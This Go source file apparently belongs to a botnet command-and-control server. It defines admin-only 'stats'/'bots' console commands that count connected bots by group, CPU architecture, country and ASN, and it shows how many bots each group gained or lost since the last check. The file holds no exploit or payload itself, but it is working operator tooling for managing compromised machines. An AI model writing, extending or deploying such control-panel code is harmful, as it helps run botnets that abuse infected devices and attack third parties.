package commands

import (
	"cnc/internal/clients"
	"cnc/internal/database"
	"cnc/internal/master/command"
	"cnc/internal/master/sessions"
	"cnc/pkg/pattern"
	"golang.org/x/exp/slices"
	"strings"
)

func init() {
	archCommand := &command.Command{
		Aliases:     []string{"architectures", "archs", "arch"},
		Description: "Displays all architectures.",
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			var dist = clients.Architectures()
			return printStatistics(session, dist, dist, nil)
		},
	}

	countriesCommand := &command.Command{
		Aliases:     []string{"location", "country"},
		Description: "Displays all countries.",
		Arguments: []*command.Argument{
			command.NewArgument("query", "", command.ArgumentString, false),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			query, err := ctx.String("query")
			if err != nil {
				return err
			}

			var dist = clients.Countries()
			return printStatistics(session, dist, dist, func(source string) bool {
				return len(query) <= 0 || strings.HasPrefix(source, query)
			})
		},
	}

	asnCommand := &command.Command{
		Aliases:     []string{"asn"},
		Description: "Displays all ASNs.",
		Arguments: []*command.Argument{
			command.NewArgument("query", "", command.ArgumentString, false),
		},
		Executor: func(session *sessions.Session, ctx *command.Context) error {
			query, err := ctx.String("query")
			if err != nil {
				return err
			}

			var dist = clients.ASN()
			return printStatistics(session, dist, dist, func(source string) bool {
				return len(query) <= 0 || strings.HasPrefix(source, query)
			})
		},
	}

	command.Create(&command.Command{
		Aliases:     []string{"stats", "statistics", "bots"},
		Roles:       []string{database.ROLE_ADMIN},
		Description: "List all connected bot groups.",

		SubCommands: []*command.Command{
			archCommand,
			countriesCommand,
			asnCommand,
			command.SubCommandListCommand,
		},

		Arguments: []*command.Argument{
			command.NewArgument("query", "", command.ArgumentString, false),
		},

		Executor: func(session *sessions.Session, ctx *command.Context) error {
			query, err := ctx.String("query")
			if err != nil {
				return err
			}

			foundPossibles := pattern.Filter(clients.Groups(), strings.Split(query, ","))
			return printStatistics(session, session.LastDistribution, clients.Distribution(), func(src string) bool {
				return len(query) <= 0 || slices.Contains(foundPossibles, src)
			})
		},
	})
}

func printStatistics(session *sessions.Session, last map[string]int, new map[string]int, pred func(source string) bool) error {
	total := 0

	for source, count := range new {
		if pred != nil && !pred(source) {
			continue
		}

		total += count

		old, exists := last[source]
		if !exists {
			_ = session.Printfln("\x1b[0m%s(\x1b[92m+%d\x1b[0m): %d", source, count, count)
			last[source] = count
			continue
		}

		difference := count - old
		if difference == 0 {
			_ = session.Printfln("\x1b[0m%s: %d", source, count)
			continue
		}

		if difference > 0 {
			_ = session.Printfln("\x1b[0m%s(\x1b[92m+%d\x1b[0m): %d", source, difference, count)
		} else {
			difference *= -1
			_ = session.Printfln("\x1b[0m%s(\x1b[91m-%d\x1b[0m): %d", source, difference, count)
		}

		session.LastDistribution[source] = count
	}

	return session.Printfln("Total: %d", total)
}
